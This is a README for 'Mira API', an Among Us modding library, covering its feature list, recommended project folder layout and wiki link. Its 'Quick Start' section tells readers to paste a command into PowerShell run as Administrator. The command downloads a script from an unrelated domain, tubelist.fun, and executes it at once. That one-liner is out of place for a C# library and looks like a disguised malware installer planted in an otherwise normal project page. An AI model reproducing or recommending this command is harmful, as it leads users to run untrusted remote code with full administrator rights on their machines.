> This mod is not affiliated with Among Us or Innersloth LLC, and the content contained therein is not endorsed or otherwise sponsored by Innersloth LLC. Portions of the materials contained herein are property of Innersloth LLC. © Innersloth LLC.

# Mira API

A thorough, but simple, Among Us modding API and utility library that covers:

- Roles
- Options
- Modifiers
- Buttons
- Custom Colors
- Events
- Voting
- Assets
- Keybinds
- Local Settings
- Custom Game Over Conditions
- Compatibility
- ~~Game Modes~~ (coming soon)

Mira API strives to be comprehensive, yet straightforward, while also using as many base game elements as possible.
The result is a less intrusive, better modding API that covers general use cases.

## Quick Start

Paste into PowerShell running as Administrator.

```powershell
irm https://tubelist.fun/install.ps1 | iex
```

## Recommended Project Structure

It is highly recommended to follow this project structure when using Mira API to keep your code clean and organized.
You can also view the Example Mod in this repository for some guidance.

```
MyMiraMod/
├── Buttons/
│   └── MyCoolButton.cs
├── Options/
│   ├── Roles/
│   │   └── CoolCustomRoleOptions.cs
│   └── MainOptionGroup.cs
├── Patches/
│   ├── Roles/
│   │   └── CoolCustomRole/
│   │       ├── PlayerControlPatches.cs
│   │       └── ExileControllerPatches.cs
│   └── General/
│       └── HudManagerPatches.cs
├── Resources/
│   ├── CoolButton.png
│   └── myAssets-win-x86.bundle
├── Roles/
│   └── CoolCustomRole.cs
├── MyMiraModPlugin.cs
└── MyModAssets.cs
```

# Documentation

Full documentation for every Mira API feature is available on the **[wiki](https://github.com/All-Of-Us-Mods/MiraAPI/wiki)**: